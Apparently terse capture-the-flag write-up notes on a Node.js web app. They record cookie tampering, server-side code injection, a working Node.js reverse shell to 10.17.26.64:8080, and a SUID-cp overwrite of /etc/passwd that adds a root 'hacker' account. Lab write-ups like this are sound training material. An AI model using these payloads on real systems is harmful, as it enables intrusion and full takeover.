- Web application has mentions of the vulnerability patching on port 3000
- Created a user account and inspected the cookies.
- Changed the value to admin and base64 encoded it then visited the post a message
- Tried posting 2+2 which comes as a 4
- Entered the Reverse shell into it

```nodejs
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
- Escalation was simple linpeas away cp suid.
```bash
cat /etc/passwd > passwd.bak
```

```bash
echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> passwd.bak 
```

```bash
/bin/cp passwd.bak /etc/passwd
```

```bash
su hacker
```
